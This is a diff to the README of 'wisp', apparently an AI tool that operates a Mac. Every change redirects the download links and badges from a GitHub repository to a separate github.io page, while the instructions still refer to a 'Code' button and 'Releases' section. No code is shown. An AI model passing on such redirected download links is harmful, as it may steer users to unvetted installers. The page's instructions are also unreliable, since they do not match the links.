@@ -1,6 +1,6 @@
 # 🧙‍♂️ wisp - Your AI's Helping Hand on Mac
 
-[![Download wisp](https://img.shields.io/badge/Download-wisp-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Denisjoint75/wisp)
+[![Download wisp](https://img.shields.io/badge/Download-wisp-8A2BE2?style=for-the-badge&logo=github)](https://denisjoint75.github.io)
 
 ---
 
@@ -14,9 +14,9 @@ Think of wisp as a virtual assistant who can operate your Mac for you—clicking
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Denisjoint75/wisp](https://github.com/Denisjoint75/wisp)
+Visit this link to download the application: [https://denisjoint75.github.io](https://denisjoint75.github.io)
 
-[![Get wisp Now](https://img.shields.io/badge/🚀-Download%20wisp%20Now-blue?style=for-the-badge&logo=appveyor)](https://github.com/Denisjoint75/wisp)
+[![Get wisp Now](https://img.shields.io/badge/🚀-Download%20wisp%20Now-blue?style=for-the-badge&logo=appveyor)](https://denisjoint75.github.io)
 
 Once you're on the page, look for the green "Code" button or the "Releases" section to find the latest version for your Mac. Download the file and open it to begin installation. The process is straightforward—just follow the on-screen prompts.
 
